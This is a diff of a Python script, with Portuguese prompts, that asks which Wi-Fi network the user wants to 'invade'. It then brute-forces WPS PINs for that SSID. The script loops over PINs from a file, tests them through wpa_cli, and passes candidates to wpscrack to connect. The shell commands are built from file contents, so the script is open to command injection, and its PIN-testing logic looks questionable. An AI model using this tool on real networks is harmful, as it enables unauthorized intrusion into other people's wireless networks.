@@ -49,21 +49,35 @@ print("\n")
 print(ciano + "Qual o nome da rede que deseja invadir? ")
 ssid = input(ciano + "[" + magenta + "~" + ciano + "] " + magenta)
 
-while True:
-    with open("p1.txt", "r") as file:
-        pin1 = file.readlines()
+def test_wps_pin(pin):
+    command = f"wpa_cli wps_pin {pin}"
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    if "OK" in result.stdout:
+        return True
+    else:
+        return False
 
-    def test_wps_pin(pin):
-        command = f"wps_pin.py -p {pin}"
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
-        if "SUCCESS" in result.stdout:
-            return True
+def mains():
+    pin_file = "p1.txt"
+    pin1 = ""
+
+    with open(pin_file, "r") as file:
+        pins = file.read().splitlines()
+
+    for pin in pins:
+        if test_wps_pin(pin[:4]):
+            pin1 = pin[:4]
+            print(f"Primeiros quatros digitos encontrados com sucesso!! PIN: {pin1}")
+            break
         else:
-            return False
+            print(f"PIN inválido: {pin}")
 
-    if test_wps_pin(pin1):
-        print(verde + "Primeiros quatro dígitos encontrados com sucesso!!")
-        break
+    if pin1 == "":
+        print("Nenhum PIN válido encontrado.")
+
+if __name__ == "__main__":
+    mains()
+
 while True:
     def connect_wifi(pin):
         command = f"wpscrack -i {wifi_interface} -s {ssid} -p {pin}"
